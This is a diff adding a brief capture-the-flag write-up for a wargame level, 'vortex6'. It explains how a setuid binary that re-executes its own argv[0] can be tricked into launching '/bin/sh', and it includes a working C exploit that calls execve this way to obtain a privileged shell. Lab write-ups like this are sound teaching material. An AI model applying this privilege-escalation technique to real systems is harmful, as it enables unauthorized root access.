@@ -1,0 +1,26 @@
+Fairly simple level.
+
+vortex6 when executed checks if envp[0] is null.
+
+If not, it calls the function 'restart', which calls execve with the same environment.
+
+What makes this exploitable, is instead of executing the exact same file, it execve's argv[0]...
+
+Since you can execve('/bin/vortex6') with an entirely different argv[0] (such as '/bin/sh'...),
+you can very easily net a privilged shell.
+
+All you do is create a with argv[0] as '/bin/sh' and a non-null envp!
+
+
+                 serverwrapper.c
+┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+  #include <unistd.h>
+
+  int main(void) {
+    char *argv[2] = {"/bin/sh", 0};
+    char *environment[2] = {"not empty", 0};
+    execve("/vortex/vortex6", argv, environment);
+  }
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
+Easy!
